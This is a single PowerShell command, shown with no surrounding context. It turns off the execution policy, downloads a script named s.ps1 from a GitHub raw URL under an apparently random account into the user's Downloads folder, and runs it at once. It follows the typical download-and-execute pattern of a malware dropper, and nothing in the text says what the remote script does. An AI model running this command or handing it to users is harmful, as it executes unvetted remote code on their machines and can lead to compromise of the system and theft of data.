```powershell
powershell.exe -ExecutionPolicy Bypass -Command "$url='https://raw.githubusercontent.com/fghjhghnjj/cocu/main/s.ps1'; $path=$env:USERPROFILE+'\Downloads\s.ps1'; Invoke-WebRequest -Uri $url -OutFile $path; & powershell.exe -ExecutionPolicy Bypass -File $path"
```
